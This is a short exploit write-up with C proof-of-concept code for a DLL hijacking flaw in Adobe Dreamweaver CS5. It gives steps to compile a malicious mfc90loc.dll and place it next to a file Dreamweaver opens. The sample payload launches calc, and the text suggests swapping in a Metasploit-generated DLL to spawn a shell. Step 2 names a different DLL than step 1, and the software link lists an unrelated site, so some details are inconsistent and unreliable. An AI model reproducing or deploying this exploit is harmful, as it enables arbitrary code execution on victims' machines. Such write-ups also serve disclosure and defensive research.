# Exploit Title: Adobe Dreamweaver CS5 DLL Hijacking Exploit (mfc90loc.dll)
# Date: 25/08/2010
# Author: Bruno Filipe (diwr) http://digitalacropolis.us
# Software Link: http://www.adobe.com <http://www.bsplayer.org>
# Version: <= 11.0 build 4909
# Tested on: WinXP SP2, WinXP SP3
# Other Adobe CS5 products may be vulnerable too.
# Thx TheLeader ;)
#
----------------------------------------------------------------------------------------------------------
# This should work with any file handled by Dreamweaver (.php, .asp, etc)
# 1. gcc dllmain.c -o mfc90loc.dll
# 2. Put mfc90ptb.dll in the same directory of a file handled by Dw (EG:
anything.php)
# 3. You can generate a msfpayload DLL and spawn a shell, for example.
#
----------------------------------------------------------------------------------------------------------

#include <windows.h>

int main()
{
  WinExec("calc", SW_NORMAL);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  main();
  return 0;
}
